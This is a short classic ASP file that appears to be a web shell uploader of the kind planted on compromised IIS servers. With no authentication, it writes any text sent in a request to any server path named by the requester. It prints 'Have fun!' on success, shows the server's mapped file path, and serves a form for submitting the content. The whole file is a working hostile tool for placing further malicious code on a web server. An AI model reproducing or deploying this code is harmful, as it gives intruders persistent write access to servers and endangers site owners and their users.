<%on error resume next%>
<%ofso="scripting.filesystemobject"%>
<%set fso=server.createobject(ofso)%>
<%path=request("path")%>
<%if path<>"" then%>
<%data=request("dama")%>
<%set dama=fso.createtextfile(path,true)%>
<%dama.write data%>
<%if err=0 then%>
<%="Have fun!"%>
<%else%>
<%="false"%>
<%end if%>
<%err.clear%>
<%end if%>
<%dama.close%>
<%set dama=nothing%>
<%set fos=nothing%>
<%="<form action='' method=post>"%>
<%="<input type=text name=path>"%>
<%="<br>"%>
<%=server.mappath(request.servervariables("script_name"))%>
<%="<br>"%>
<%=""%>
<%="<textarea name=dama cols=50 rows=10 width=30></textarea>"%>
<%="<br>"%>
<%="<input type=submit value=OK~>"%>
</body></html>